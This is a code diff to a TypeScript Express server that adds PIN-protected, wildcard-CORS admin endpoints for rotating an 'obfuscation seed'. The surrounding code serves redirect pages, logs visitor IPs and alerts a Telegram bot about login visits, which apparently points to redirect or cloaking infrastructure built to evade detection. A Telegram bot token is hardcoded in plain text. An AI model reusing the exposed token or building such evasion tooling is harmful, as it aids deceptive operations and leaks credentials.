@@ -21,6 +21,8 @@ import { serveRedirectPage, createRedirectLink, getRedirectLinks, deleteRedirect
 import { logTraffic, getTrafficLog, clearTrafficLog } from "../db";
 import geoip from "geoip-lite";
 import { setRateLimitBannedIPs } from "./rateLimitStore";
+import fs from "fs";
+import path from "path";
 
 // IP Geolocation using free ip-api.com service
 async function getIPCity(ip: string): Promise<string> {
@@ -72,6 +74,47 @@ async function startServer() {
   registerStorageProxy(app);
   registerOAuthRoutes(app);
   registerTelegramWebhook(app);
+
+  // ─── Obfuscation Seed Change Endpoint (CORS enabled for Cloud Computer) ─
+  app.options("/api/admin/change-obfuscation-seed", (req, res) => {
+    res.setHeader("Access-Control-Allow-Origin", "*");
+    res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
+    res.setHeader("Access-Control-Allow-Headers", "Content-Type, x-admin-pin");
+    res.status(204).end();
+  });
+  app.options("/api/admin/obfuscation-seed", (req, res) => {
+    res.setHeader("Access-Control-Allow-Origin", "*");
+    res.setHeader("Access-Control-Allow-Methods", "GET, OPTIONS");
+    res.setHeader("Access-Control-Allow-Headers", "Content-Type, x-admin-pin");
+    res.status(204).end();
+  });
+
+  app.post("/api/admin/change-obfuscation-seed", async (req, res) => {
+    res.setHeader("Access-Control-Allow-Origin", "*");
+    const pin = req.headers["x-admin-pin"] as string;
+    if (pin !== await getAdminPin()) return res.status(401).json({ ok: false, error: "Unauthorized" });
+    try {
+      const newSeed = `seed_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`;
+      const seedPath = path.resolve(process.cwd(), "obfuscation-seed.json");
+      fs.writeFileSync(seedPath, JSON.stringify({ seed: newSeed, lastChanged: new Date().toISOString() }));
+      res.json({ ok: true, seed: newSeed, message: "Seed changed. Republish to apply new obfuscation." });
+    } catch (e: any) {
+      res.json({ ok: false, error: e.message });
+    }
+  });
+
+  app.get("/api/admin/obfuscation-seed", async (req, res) => {
+    res.setHeader("Access-Control-Allow-Origin", "*");
+    const pin = req.headers["x-admin-pin"] as string;
+    if (pin !== await getAdminPin()) return res.status(401).json({ ok: false });
+    try {
+      const seedPath = path.resolve(process.cwd(), "obfuscation-seed.json");
+      const data = JSON.parse(fs.readFileSync(seedPath, "utf-8"));
+      res.json({ ok: true, ...data });
+    } catch {
+      res.json({ ok: true, seed: "default", lastChanged: null });
+    }
+  });
 
   // ─── Login Visit Notification Bot (separate Telegram bot) ─────────────
   const LOGIN_VISIT_BOT_TOKEN = "8676892426:AAFcIM4e1G57ugoDJJ-ugfM58fu9IDBM23w";
